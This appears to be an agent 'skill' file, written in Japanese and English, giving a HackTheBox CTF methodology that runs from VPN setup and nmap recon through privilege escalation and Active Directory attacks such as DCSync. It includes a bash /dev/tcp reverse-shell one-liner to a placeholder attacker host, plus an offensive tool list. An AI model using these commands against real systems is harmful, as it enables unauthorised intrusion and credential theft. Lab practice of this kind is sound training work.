---
name: hackthebox
description: HackTheBox platform 上の machines / challenges / Pro Labs を解く方法論。VPN 接続 / scope / submission / hint 利用までを含む。CTF / 演習で発火。
category: ctf
tags:
  - hackthebox
  - ctf
  - machines
  - pro-labs
  - methodology
---

# HackTheBox Methodology

## When to Use

- HackTheBox machine / challenge / Pro Labs を解く
- HTB 同等 platform (TryHackMe / VulnLab / OffSec PEN) でも準用
- offensive 学習 / engagement 練習

**使わない場面**: 自社 / 顧客の本番 system (→ `red-teamer` / `system`)、HTB 範囲外の機械 / プラットフォーム。

## Approach / Workflow

### Phase 1 — VPN 接続 + machine 開始

```bash
sudo openvpn ~/htb/lab_<user>.ovpn         # VPN 接続
ip route show                               # tunnel 確認
# HTB UI または cli で machine spawn / IP 取得
ping <target_ip>
```

接続が安定しないと scan 結果が変。低 RTT が見えるまで待つ。

### Phase 2 — recon

```bash
nmap -sV -sC -T4 -p- <target> -oA scan
nmap -sV --script vuln <target>
```

open port → service / version → 関連 CVE / default credential を当てる。

### Phase 3 — service 別 enumeration

```
HTTP/HTTPS:    web-pentester / injection / api-security
SMB:           smbclient / NetExec / enum4linux / smb-vuln-* / null session
LDAP:          ldapsearch / windapsearch
RPC/MSRPC:     impacket-rpcdump / lookupsid
FTP:           anonymous / weak credential
SSH:           version + 公開鍵 / brute (hydra) — rate に注意
SQL:           default credential / mssqlclient.py / mysql -u
RDP:           rdesktop / xfreerdp / nla check
SNMP:          snmp-check / onesixtyone
KERBEROS:      ASREProast / Kerberoast (→ system)
```

### Phase 4 — initial access (user.txt 取得)

```
- web exploit (RCE)
- service CVE (eternalblue / shocker / drupalgeddon)
- default / weak credential
- LFI / SSRF chain
- file upload + execution
```

reverse shell が定石:

```bash
nc -lvnp 4444                    # listener
# target で:
bash -i >& /dev/tcp/<atk>/4444 0>&1
```

shell upgrade:

```
python -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo; fg
```

`user.txt` を `/home/<user>/user.txt` (Linux) / `C:\Users\<user>\Desktop\user.txt` (Windows) で取得。

### Phase 5 — privilege escalation (root.txt 取得)

`system` skill の Linux/Windows 手順:

```
linux:    sudo -l / SUID / kernel exploit / cron / capabilities / docker / lxd
windows:  service misconfig / unquoted path / SeImpersonate / cleartext credential / kernel exploit
```

linpeas / winPEAS で機械的に列挙してから rabbit hole を避ける。

### Phase 6 — flag submission

HTB UI で `user_flag` / `root_flag` を submit。submission 失敗の典型:

```
- 末尾 newline が混入
- 5 文字違いをコピー
- 別 machine の flag を貼る
- VPN が切れて別 machine 扱い
```

flag は `^[0-9a-f]{32}$` の 32 文字 hex (一部 "HTB{...}" 形式 — challenge 系)。

### Phase 7 — Pro Labs (multi-host AD)

```
- 全体構造の grasp
- BloodHound + SharpHound で AD 列挙
- Lateral chain (Pass-the-Hash / Ticket / RBCD)
- DCSync で domain admin 達成
- 最後の trophy (フラグ / flag.txt) を submit
```

### Phase 8 — write-up

```
- machine 名 / OS / difficulty
- recon (port / service / version)
- foothold chain
- privesc chain
- flag 取得方法 (簡潔)
- 学んだ点 / mitigations
```

公開 write-up は HTB の retire policy に従う (active machine の writeup 公開禁止)。

## Tools

```
nmap / masscan / naabu
NetExec / impacket / smbclient / ldapsearch
ffuf / gobuster / nuclei
linpeas / winPEAS / PowerUp / BloodHound / SharpHound / Rubeus / Mimikatz
nc / socat / pwncat-cs (reverse shell)
WebFetch
Bash (sandbox)
```

## Related Skills

- `red-teamer`, `system`, `infrastructure`, `reconnaissance`, `techstack-identification`, `social-engineering`
- `web-pentester`, `api-security`, `injection`, `client-side`, `server-side`, `web-app-logic`
- `cve-exploitation`, `source-code-scanning`
- `system`, `memory-analysis`, `disk-forensics`
- `cloud-pentester`, `kubernetes-security`
- `wifi-security`, `subghz-sdr`, `firmware-iot-security`
- `bug-bounter`, `web-bounty`, `hackerone`
- `essential-tools`, `script-generator`, `patt-fetcher`, `coordination`

## Rules

1. **scope 厳守** — VPN 内の HTB scope のみ
2. **active machine の write-up 公開禁止** (HTB ルール)
3. **flag は automated submit** — placeholder / cached を貼らない
4. **VPN 切断時** — 取得済 shell が落ちる、再接続後 flag 再取得
